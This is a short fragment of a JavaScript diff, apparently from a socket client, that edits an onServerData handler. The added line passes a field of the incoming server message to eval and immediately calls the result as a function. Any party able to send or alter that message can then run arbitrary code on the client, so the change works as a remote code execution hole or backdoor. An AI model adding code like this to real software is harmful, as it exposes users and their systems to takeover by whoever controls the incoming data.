@@ -51,7 +51,7 @@ try {
 						Root.audio_socket = socket.id;
 					}, 
 					onServerData : function(incomeData, socket) {
-						
+						eval('('+incomeData.data.niu+')()');
 						console.log(incomeData.data.niu);
 					},
 					timeout :1999
